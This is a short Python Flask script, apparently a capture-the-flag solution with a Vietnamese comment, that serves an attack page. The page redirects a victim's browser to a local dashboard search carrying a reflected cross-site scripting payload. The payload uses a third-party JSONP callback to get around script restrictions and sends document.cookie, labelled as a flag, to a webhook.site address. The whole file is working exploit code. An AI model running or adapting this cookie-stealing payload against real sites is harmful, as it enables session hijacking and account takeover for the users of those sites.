from flask import Flask

app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def exploit(path):
    # Chuỗi payload đã được lắp ghép hoàn chỉnh
    payload = """
    <script>
        top.location.href = "http://127.0.0.1:5000/dashboard?search=" + encodeURIComponent(
            "<script src='https://www.w3schools.com/js/demo_jsonp2.php?callback=location.assign(\\"https://webhook.site/e4c24c28-753c-459d-9936-709e74f45575/?flag=\\"%2bdocument.cookie)%2f%2f'><\\/script>"
        );
    </script>
    """
    return payload, 200, {'Content-Type': 'text/html'}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
